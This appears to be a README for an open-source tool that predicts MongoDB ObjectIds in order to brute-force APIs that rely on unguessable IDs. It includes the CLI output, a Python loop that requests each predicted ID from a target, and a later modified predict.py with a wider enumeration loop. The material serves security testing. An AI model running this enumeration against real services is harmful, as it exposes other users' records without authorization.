## Mongo ObjectId introduction

[Mongo ObjectId](https://docs.mongodb.com/manual/reference/method/ObjectId/)s are generated
in a predictable manner, the 12-byte ObjectId value consists of:

- a 4-byte value representing the seconds since the Unix epoch,
- a 3-byte machine identifier,
- a 2-byte process id, and
- a 3-byte counter, starting with a random value.

Some web and REST APIs use these as resource IDs, and because developers believe they
are randomly generated or difficult to guess, they are also frequently used as (a very
weak) authorization layer: if you know the ObjectId then you have to be the right
user.

A potentially vulnerable REST API will look like this:

```http
GET /pet/5ae9b90a2c144b9def01ec37 HTTP/1.1
Host: vulnerable.com
X-API-Key: ...
```

And the code that handles that request (notice the lack of authorization):

```python
@route('/pet/{id}')
@is_authenticated
def handle_get_pet(id):
    return PetFromMongoORM.get(id)
```

## Predicting Mongo ObjectIds

The tool I created will predict Mongo ObjectIds given a valid initial value:

```
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
...
5ae9bac82c144b9def01ec39
...
5ae9bacf2c144b9def01ec3a
...
5ae9bada2c144b9def01ec3b
```

Usually you'll use this tool together with Burp, or your own custom script in
order to brute-force a resource:

```python
import requests

from mongo_objectid_predict import predict

for objectid in predict('5ae9b90a2c144b9def01ec37'):
    response = requests.get('http://target.com/resource/%s' % objectid)
    process_response(response)
```

## Controlling the prediction process

There are two command line parameters which will control how many potential mongo
ObjectIds are generated: `--counter-diff` and `--per-counter`.

Counter diff will control the iteration over the last 3 bytes (the counter) of the
ObjectId. So, if the last 3 bytes from the base ObjectId were `000020`, you can control
how much to increment or decrement this value using `--counter-diff`. By default we set
it to `20`.

Per counter will control the first 4 bytes of the ObjectId: the epoch time. For each
newly generated counter (last 3 bytes) the tool will generate N `--per-counter` epoch
times.

It is important to know that ObjectIds are generated for all MongoDB tables: the counter
will be incremented for objects which are not the one queried by the application. This
means that depending on the way the application was developed, its load, etc. you might
need to play with `--counter-diff` and `--per-counter` until something interesting is
found.

The last parameter you can use is `--backward`. Instead of adding to the counter the tool
will decrease it. The same thing happens with the epoch counter.

## Improvements

This tool should work on simple MongoDB installations, where no clusters are used (machine
identifier remains constant) and the MongoDB hasn't been restarted (process ID remains
constant).

For other scenarios prediction is still possible, but requires more requests and potentially
[a different algorithm](https://github.com/andresriancho/mongo-objectid-predict/issues/1)
which receives more samples, analyzes them and then starts producing ObjectIds for that
specific installation.

# Tuning for "아니 근데 오늘 진짜" mongo objectid predict

Before predict.py code

```python
import operator

from .object_id import ObjectId


def predict(base, backward=False, counter_diff=20, per_counter=60):
    """
    :param base: The base object ID

    :param backward: True if we should predict object IDs which were created before the base.

    :param counter_diff: How many +1 or -1 do we want to try to brute-force in the 3-byte
                         counter?

    :param per_counter: The ObjectId has a counter which auto-increments (+1)
                        on each object creation. For each counter that we increment
                        or decrement (depending on forward parameter) this parameter
                        determines how many seconds we have to add or substract to
                        the epoch.

    :yield: Object ids
    """
    looks_like, reason = ObjectId.looks_like(base)
    if not looks_like:
        raise Exception(reason)

    base = ObjectId(base)
    oper = {False: operator.add, True: operator.sub}.get(backward)

    for counter_iter in xrange(1, counter_diff):
        for epoch_iter in xrange(per_counter):
            copy = base.copy()

            copy.counter = oper(copy.counter, counter_iter)
            copy.epoch = oper(copy.epoch, epoch_iter)

            yield str(copy)
```

After predict.py code

```python
import operator

from .object_id import ObjectId


def predict(base, backward=False, counter_diff=20, per_counter=60):
    """
    :param base: The base object ID

    :param backward: True if we should predict object IDs which were created before the base.

    :param counter_diff: How many +1 or -1 do we want to try to brute-force in the 3-byte
                         counter?

    :param per_counter: The ObjectId has a counter which auto-increments (+1)
                        on each object creation. For each counter that we increment
                        or decrement (depending on forward parameter) this parameter
                        determines how many seconds we have to add or substract to
                        the epoch.

    :yield: Object ids
    """
    # looks_like, reason = ObjectId.looks_like(base)
    # if not looks_like:
    #     raise Exception(reason)

    # base = ObjectId(base)
    # oper = {False: operator.add, True: operator.sub}.get(backward)

    # for counter_iter in range(1, counter_diff):
    #     for epoch_iter in range(per_counter):
    #         copy = base.copy()

    #         copy.counter = oper(copy.counter, counter_iter)
    #         copy.epoch = oper(copy.epoch, epoch_iter)

    #         yield str(copy)
    looks_like, reason = ObjectId.looks_like(base)
    if not looks_like:
        raise Exception(reason)

    base = ObjectId(base)

    # Loop through all combinations of changing the last 3 digits of the timestamp
    for timestamp_variation in range(4096):  # 16^3 = 4096
        modified_timestamp = base.epoch + timestamp_variation

        # Loop through all combinations of changing the last digit of the counter
        # copy_base_counter = base.counter
        for counter_variation in range(16):  # 16^1 = 16
            modified_counter = base.counter + counter_variation

            # Yield the modified ObjectId
            yield str(ObjectId("%08x%s%s%06x" % (modified_timestamp, base.machine, base.process, modified_counter)))
```
